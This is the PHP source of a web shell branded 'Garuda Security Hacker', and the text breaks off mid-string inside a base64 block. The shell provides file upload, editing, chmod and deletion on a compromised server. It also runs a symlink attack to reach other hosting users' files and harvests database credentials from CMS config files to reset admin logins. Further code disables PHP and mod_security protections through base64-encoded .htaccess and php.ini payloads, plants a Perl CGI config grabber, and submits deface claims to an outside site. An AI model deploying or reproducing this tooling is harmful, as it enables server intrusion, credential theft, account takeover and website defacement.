<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>Garuda Security Hacker</title>
<style>
html {
	 background: url(https://i.imgsafe.org/4bfbc6edf8.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
body{cursor: url("http://downloads.totallyfreecursors.com/thumbnails/aliendance.gif"), auto;}
 #menu a {
				padding:2px 10px;  
				margin:0; 
				background:#222222; 
				text-decoration:none; 
				letter-spacing:2px; 
				padding: 2px 10px;
				margin: 0;
				background: #222222;
				text-decoration: none;
				letter-spacing: 2px;
				border-radius: 2px;
				border-bottom: 2px solid #B5AFAF;
				border-top: 2px solid #B5AFAF;
				border-right: 2px solid darkblue;
				border-left: 2px solid darkblue;
 }
body{
font-family: "Racing Sans One", cursive;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<BODY>
<table width="100%" border="100%" cellpadding="1" cellspacing="2" align="center">
<tr><td><font color=white>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}

$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){	
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo "<br><font color=white>".php_uname()."</font><br>";
echo "Server IP: <font color=blue>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
 if(@ini_get("safe_mode")){echo "<br><br>Safe Mode = <font color='red'>ON";}else{ echo "Safe Mode = OFF<br>";}
if(@ini_get("disable_functions"))
echo '</td></tr><tr><td>';

echo "<hr>";
echo '<center><div id="menu">';
echo "<ul>";
echo "<a href='?'>Home</a>";
echo "<a href='?dir=$path&gsh=upload'>Upload</a>";
echo "<a href='?dir=$path&gsh=jumping'>Jumping</a>";
echo "<a href='?dir=$path&gsh=cpanel'>Cpanel Crack</a>";
echo "<a href='?dir=$path&gsh=config'>Config</a>";
echo "<a href='?dir=$path&gsh=auto_edit_user'>Auto Edit User</a>";
echo "<a href='?dir=$path&gsh=zoneh'> Zone-h</a>";
echo "<a href='?dir=$path&gsh=defacerid'>DefacerID</a>";
echo "<a href='?dir=$path&gsh=symlink'>Symlink</a>";
echo "<a href='?dir=$path&gsh=adminer'>Adminer</a>";
echo "<a href='?dir=$path&gsh=about'>About</a>";
echo '<a href="?xp=just_jumping">Just Jumping</a><br><br>';
echo '<a href="?xp=config_grabber_wp_jm">Config Grabber WP dan Joomla</a>';
echo '<a href="?xp=pepes_joomla">Auto Deface site cms joomla</a>';
echo '<a href="?xp=pepes_wp">Auto Deface site Wordpress</a>';
echo '<a href="?xp=pepes_wp2">Auto Deface site Wordpress 2</a>';
echo ' <br><br><a href="?xp=link_title">Title site Wordpress</a>';
echo "<a href='?dir=$path&gsh=bypass'>Bypass</a>";
echo "<a href='?dir=$path&gsh=autoklik'>Auto Deface</a>";

echo "</ul>";
echo "</center>";
echo "<hr>";
echo '</td></tr><tr><td>';
echo '<center>';
 echo '<div class="kotak"><a href="?xp=bypass">Bypass disabled Functions</a></div> <div class="kotak"><a href="?xp=cgi">CGI Telnet</a></div><div class="kotak"></a></div>';
 echo '</td></tr>';
 set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '</td></tr>';
echo '</center>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="blue">Change Permission Done Bang ^_^.</font><br />';
}else{
echo '<font color="red">Change Permission Error Bang :(.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="blue">Change Name Done Bang ^_^.</font><br />';
}else{
echo '<font color="red">Change Name Error Bang :(.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done Bang ^_^.</font><br />';
}else{
echo '<font color="red">Edit File Error Bang :(.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="blue">Delete Dir Done Bang ^_^.</font><br />';
}else{
echo '<font color="red">Delete Dir Error Bang :(.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="blue">Delete File Done Bang ^_^.</font><br />';
}else{
echo '<font color="red">Delete File Error Bang :(.</font><br />';
}
}

	}elseif($_GET['gsh'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Fuck'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='GarudaSecurityHacker'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
} elseif($_GET['gsh'] == 'symlink')
{  
@set_time_limit(0);
 
echo "<br><br><center><h1>Symlink by gshShell</h1></center><br><br><center><div class=content>";
 
@mkdir('sym',0777);
$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'>[ /etc/named.conf ]</pre></center>";
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='blue' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '.ir';
$israel = '.il';
$indo   = '.id';
$sg12   = '.sg';
$edu    = '.edu';
$gov    = '.gov';
$gose   = '.go';
$gober  = '.gob';
$mil1   = '.mil';
$mil2   = '.mi';
$malay  = '.my';
$china  = '.cn';
$japan  = '.jp';
$austr  = '.au';
$porn   = '.xxx';
$as     = '.uk';
$calfn  = '.ca';
 
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>
 
<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>
 
<td>
'.$UID['name']."
</td>
 
<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>
 
</tr></div> ";
flush();
}
}
}
}
 
echo "</center></table>";  
} elseif($_GET['gsh'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='garuda' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='security' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	} 
		
		} elseif($_GET['gsh'] == 'upload'){
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload Berhasil</font><br />';
}else{
echo '<font color="red">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>';
} elseif($_GET['gsh'] == 'bypass') {
	?>
	<form method="post">
<input type="submit" name="x" value=".htaccess"> Fungsi ini sebagai bypass symlink(internal server Error)
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = ".htaccess";
		$isi_nama_doang = "T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBsaW51eHNlYy5odG0NCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgdHh0IC5waHA=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done .htaccess<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
		?>
		<form method="post">
<input type="submit" name="y" value="php.ini">Fungsi ini sebagai bypass Disable Functions(Mod Security )
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['y']) {
	foreach($target as $korban) {
		$global = "php.ini";
		$isi_nama_doang = "DQpzYWZlX21vZGUgPSBPRkYNCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ0K";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done php.ini<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
		?>
		<form method="post">
<input type="submit" name="a" value=".htaccess1">Fungsi ini sebagai bypass Disable Functions(Mod Security )
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['a']) {
	foreach($target as $korban) {
		$global = ".htaccess";
		$isi_nama_doang = "DQo8SWZNb2R1bGUgbW9kX3NlY3VyaXR5LmM+DQogICBTZWNGaWx0ZXJFbmdpbmUgT2ZmDQogICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+DQo=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done .htaccess1<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
</font><br><br>
    <td><table width='100%' height='173'>
        <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form method='post'>
            <div align='center'>
              <input type='submit' name='elgass' value='Click Ini Gan'> Virtual Hosting
            </div>
        </form></td>
<?php
if (isset($_POST['elgass']))
{
@mkdir('vhost', 0755);
@chdir('vhost');
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";   
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
$xaivhost = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxubiI7DQpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT4uOlByaXY4IHZob3N0cyBDb25maWcgR3JhYmJlciB2MC4xOi48L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiB1YnVudHU7DQogZm9udC1zaXplOiB4LWxhcmdlOw0KIGNvbG9yOiB3aGl0ZTsNCiBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCg0KDQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPi46IENvZGVkIGJ5IEZhbGxhZyBHYXNzcmluaSBSZWNvZGVkIEJ5IGVYZVVzZXIgOi48L3A+DQo8cD5rcmVvbnJpbnRvQGdtYWlsLmNvbTwvcD4NCjxwPmh0dHA6Ly9mYi5jb20vcmludG8yMjM0PC9wPic7DQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRza